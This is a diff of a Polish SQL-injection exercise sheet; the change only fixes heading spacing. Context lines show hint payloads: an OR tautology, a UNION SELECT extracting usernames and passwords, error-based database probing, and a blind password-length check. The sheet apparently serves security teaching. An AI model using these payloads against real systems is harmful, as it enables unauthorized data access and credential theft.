@@ -1,6 +1,6 @@
 ## SQL-injection
 
-##Zadanie 1
+## Zadanie 1
 
 Wyświetlić dane wszystkich użytkowników, omijając warunek WHERE id = ?.
 
@@ -24,7 +24,7 @@ Podpowiedź
 1' OR '1'='1
 </details>
 
-##Zadanie 2
+## Zadanie 2
 
 Użyć UNION SELECT, aby pobrać dane z innej tabeli (users).
 
@@ -37,7 +37,7 @@ Podpowiedź
 1' UNION SELECT user, password FROM users -- -
 </details>
 
-##Zadanie 3
+## Zadanie 3
 
 Wykryć z jakiego systemu baz danych korzysta strona za pomocą error-based SQL Injection
 
@@ -50,7 +50,7 @@ Podpowiedź
 '
 </details>
 
-##Zadanie 4
+## Zadanie 4
 
 Sprawdzić długość hasła admina
 
@@ -63,7 +63,7 @@ Podpowiedź
 1' AND LENGTH(password)=32 -- -
 </details>
 
-##Zadanie 5
+## Zadanie 5
 
 Ominąć sanityzację wejścia 
 
